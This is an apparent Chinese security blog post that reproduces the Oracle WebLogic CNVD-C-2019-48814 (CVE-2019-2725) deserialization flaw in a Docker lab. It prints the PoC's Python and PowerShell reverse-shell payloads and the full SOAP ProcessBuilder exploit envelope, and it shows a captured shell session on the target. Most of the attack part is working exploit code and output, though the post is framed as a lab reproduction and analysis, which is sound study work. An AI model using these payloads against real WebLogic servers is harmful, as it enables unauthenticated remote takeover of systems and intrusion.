<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>CNVD-C-2019-48814 · Damn1t's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.png"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/logo.png"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Damn1t</div><div class="profile-signature">for you I bleed myself dry</div><div class="friends"><div>FRIENDS</div><span><a href="//www.baidu.com" target="_black">baidu</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Damn1t's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">CNVD-C-2019-48814</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-05-04</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="cve"> cve</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="CNVD-C-2019-48814复现"><a href="#CNVD-C-2019-48814复现" class="headerlink" title="CNVD-C-2019-48814复现"></a>CNVD-C-2019-48814复现</h1><p>docker搭建环境：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker pull ismaleiva90/weblogic12</span><br><span class="line"></span><br><span class="line">docker run -d -<span class="selector-tag">p</span> <span class="number">49163</span>:<span class="number">7001</span> -<span class="selector-tag">p</span> <span class="number">49164</span>:<span class="number">7002</span> -<span class="selector-tag">p</span> <span class="number">49165</span>:<span class="number">5556</span> ismaleiva90/weblogic12:latest</span><br><span class="line">http:<span class="comment">//localhost:49163/console</span></span><br><span class="line">User: weblogic</span><br><span class="line">Pass: welcome1</span><br></pre></td></tr></table></figure></p>
<p>漏洞验证：登入-&gt;<a href="http://xx.xx.xx.xxx:49163/_async/AsyncResponseService" target="_blank" rel="noopener">http://xx.xx.xx.xxx:49163/_async/AsyncResponseService</a><br><img src="https://images.seebug.org/content/images/2019/05/01/1556688743000-3.png-w331s" alt=""><br>若出现如上述页面则可确定漏洞基本存在</p>
<p>poc：<a href="https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py" target="_blank" rel="noopener">https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py</a><br>验证方式：<br>在攻击机开启本地监听，<code>nc -lvvp 2333</code><br>调用脚本：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc<span class="selector-class">.py</span> -l <span class="number">192.168</span>.<span class="number">10.144</span> -<span class="selector-tag">p</span> <span class="number">2333</span> -r http:<span class="comment">//192.168.10.145:49163</span></span><br></pre></td></tr></table></figure></p>
<p>这里似乎如果将监听地址写为<code>127.0.0.1</code>是不行的，只能改为在内网中的地址，拿到shell</p>
<blockquote>
<p>listening on [any] 2333 …<br>192.168.10.145: inverse host lookup failed: Unknown host<br>connect to [192.168.10.144] from (UNKNOWN) [192.168.10.145] 36844<br>sh: no job control in this shell<br>sh-4.2$ whoami<br>whoami<br>oracle<br>sh-4.2$ ls<br>ls<br>autodeploy<br>bin<br>common<br>config<br>console-ext<br>derby.log<br>fileRealm.properties<br>init-info<br>lib<br>nodemanager<br>security<br>servers<br>startWebLogic.sh<br>sh-4.2$ </p>
</blockquote>
<p>漏洞描述：</p>
<blockquote>
<p>Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: Web Services). Supported versions that are affected are 10.3.6.0.0 and 12.1.3.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server</p>
</blockquote>
<p>poc分析：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, check, rhost, lhost, lport, windows)</span></span><span class="symbol">:</span></span><br></pre></td></tr></table></figure></p>
<p>url检查，测定漏洞点存在与否<br>目标地址，监听地址和端口<br><strong>windows</strong>则是检查目标的操作系统，默认为unix，若为windows则要添加参数<br>unix或linux下的shell生成方式：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self.cmd_payload = (</span><br><span class="line">    <span class="string">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket."</span></span><br><span class="line">    <span class="string">"SOCK_STREAM);s.connect((<span class="subst">\"</span>&#123;lhost&#125;<span class="subst">\"</span>,&#123;lport&#125;));os.dup2(s.fileno(),0); os.dup2("</span></span><br><span class="line">    <span class="string">"s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="subst">\"</span>/bin/sh<span class="subst">\"</span>,<span class="subst">\"</span>-i<span class="subst">\"</span>]);'"</span></span><br><span class="line">).format(lhost=self.lhost, lport=self.lport)</span><br></pre></td></tr></table></figure></p>
<p>windows下shell生成：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">self.cmd_payload = (</span><br><span class="line">    <span class="string">r"powershell -w hidden -nop -c function RSC&#123;if ($c.Connected -eq $true) "</span></span><br><span class="line">    <span class="string">r"&#123;$c.Close()&#125;;if ($p.ExitCode -ne $null) &#123;$p.Close()&#125;;exit;&#125;;$a='"</span> + self.lhost +<span class="string">""</span></span><br><span class="line">    <span class="string">r"';$p='"</span>+ self.lport + <span class="string">"';$c=New-Object system.net.sockets.tcpclient;$c.connect($a"</span></span><br><span class="line">    <span class="string">r",$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;"</span></span><br><span class="line">    <span class="string">r"$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';"</span></span><br><span class="line">    <span class="string">r"$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;"</span></span><br><span class="line">    <span class="string">r"$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;"</span></span><br><span class="line">    <span class="string">r"$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;"</span></span><br><span class="line">    <span class="string">r"while($os.Peek() -ne -1)&#123;$o += $e.GetString($os.Read())&#125;;"</span></span><br><span class="line">    <span class="string">r"$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;"</span></span><br><span class="line">    <span class="string">r"while (-not $d) &#123;if ($c.Connected -ne $true) &#123;RSC&#125;;$pos=0;$i=1; while (($i -gt 0)"</span></span><br><span class="line">    <span class="string">r" -and ($pos -lt $nb.Length)) &#123;$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;"</span></span><br><span class="line">    <span class="string">r"if (-not $pos -or $pos -eq 0) &#123;RSC&#125;;if ($nb[0..$($pos-1)] -contains 10) &#123;break&#125;&#125;;"</span></span><br><span class="line">    <span class="string">r"if ($pos -gt 0)&#123;$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if "</span></span><br><span class="line">    <span class="string">r"($p.ExitCode -ne $null)&#123;RSC&#125;else&#123;$o=$e.GetString($os.Read());while($os.Peek() -ne"</span></span><br><span class="line">    <span class="string">r" -1)&#123;$o += $e.GetString($os.Read());if ($o -eq $str) &#123;$o=''&#125;&#125;;$s.Write($e."</span></span><br><span class="line">    <span class="string">r"GetBytes($o),0,$o.length);$o=$null;$str=$null&#125;&#125;else&#123;RSC&#125;&#125;;"</span></span><br></pre></td></tr></table></figure></p>
<p>exp部分：<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">def get_process_builder_payload(self):</span></span><br><span class="line"><span class="xml">        process_builder_payload = '''<span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:wsa</span>=<span class="string">"http://www.w3.org/2005/08/addressing"</span> <span class="attr">xmlns:asy</span>=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span>   </span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span></span><span class="template-variable">&#123;cmd_base&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span></span><span class="template-variable">&#123;cmd_opt&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span></span><span class="template-variable">&#123;cmd_payload&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span>'''</span></span><br><span class="line"><span class="xml">        return process_builder_payload.format(cmd_base=self.cmd_base(), cmd_opt=self.cmd_opt(),</span></span><br><span class="line"><span class="xml">                                      cmd_payload=self.cmd_payload)</span></span><br></pre></td></tr></table></figure></p>
<p>执行的具体流程：<br><img src="https://images.seebug.org/content/images/2019/05/01/1556688745000-25.png-w331s" alt=""></p>
<p>分析参考：<br><a href="https://paper.seebug.org/909/#417" target="_blank" rel="noopener">https://paper.seebug.org/909/#417</a><br><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2725" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2725</a><br><a href="http://pupiles.com/xmldecoder.html" target="_blank" rel="noopener">http://pupiles.com/xmldecoder.html</a></p>
<p>复现参考：<br><a href="https://www.o2oxy.cn/2204.html" target="_blank" rel="noopener">https://www.o2oxy.cn/2204.html</a></p>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/05/04/cve/CNVD-C-2019-48814/">http://microvorld.com/2019/05/04/cve/CNVD-C-2019-48814/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/05/04/vulnerable/padding oracle attack/" title="padding oracle"><span>< PreviousPost</span><br><span class="prevTitle">padding oracle</span></a><a class="nextSlogan" href="/2019/05/03/靶机/hack the box邀请码获取和web challenge/" title="hack the box邀请码获取和web challenge"><span>NextPost ></span><br><span class="nextTitle">hack the box邀请码获取和web challenge</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CNVD-C-2019-48814复现"><span class="toc-number">1.</span> <span class="toc-text">CNVD-C-2019-48814复现</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>